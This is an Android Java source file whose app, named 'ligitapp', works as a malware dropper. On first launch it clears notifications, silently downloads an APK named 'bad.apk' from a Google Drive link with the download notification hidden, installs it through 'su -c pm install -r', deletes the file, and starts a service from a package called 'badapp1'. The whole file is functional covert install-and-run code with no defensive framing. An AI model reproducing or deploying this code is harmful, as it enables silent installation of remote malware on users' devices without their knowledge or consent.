package com.cyber.avi.ligitapp;

import android.app.DownloadManager;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.InvalidKeyException;
import java.util.Arrays;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {

    private long enq;
    BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (DownloadManager.ACTION_DOWNLOAD_COMPLETE.equals(action)) {
                long downloadId = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, 0);
                DownloadManager.Query query = new DownloadManager.Query();
                query.setFilterById(enq);
                DownloadManager downloadManager = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                Cursor c = downloadManager.query(query);
                if (c.moveToFirst()) {
                    int columnIndex = c.getColumnIndex(DownloadManager.COLUMN_STATUS);
                    if (DownloadManager.STATUS_SUCCESSFUL == c.getInt(columnIndex)) {
                        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "bad.apk");
                        if(file.exists()){
                            try {

                                String command;
                                command = "pm install -r " + file.getAbsolutePath();
                                Process process = Runtime.getRuntime().exec(new String[] { "su", "-c", command });
                                process.waitFor();


                                BufferedReader bufferedReader = new BufferedReader(
                                        new InputStreamReader(process.getInputStream()));

                                String response = new String();
                                for (String line; (line = bufferedReader.readLine()) != null; response += line);

                                BufferedReader bufferedReader2 = new BufferedReader(
                                        new InputStreamReader(process.getErrorStream()));

                                String response2 = new String();
                                for (String line; (line = bufferedReader2.readLine()) != null; response2 += line);

                                file.delete();

                                //start service
                                command = "am startservice com.example.avi.badapp1/.MyService";
                                Process process2 = Runtime.getRuntime().exec(new String[] { "su", "-c", command } );
                                process2.waitFor();
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        registerReceiver(receiver, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));
        NotificationManager notificationManager = (NotificationManager) getApplicationContext().getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.cancelAll();

        SharedPreferences sharedPref = getSharedPreferences("key", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPref.edit();
        String isFirst = sharedPref.getString("isFirst", null);

        if(isFirst == null) {
            downloadApk();
            editor.putString("isFirst", "false");
            editor.commit();
        }
    }

    private void downloadApk(){
        try {
            //String url = "https://www.dropbox.com/s/ffn3x1zdu1w750u/bad.apk?dl=1";
            String url = "https://drive.google.com/uc?export=download&id=1MjGdalLfYGj4BKoIEvlUBz9pWyzAdDuC";
            DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
            request.setDescription("apk dowload");
            request.setTitle("apk dowload");
            request.allowScanningByMediaScanner();
            request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);
            request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "bad.apk");
            DownloadManager manager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
            enq = manager.enqueue(request);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


}
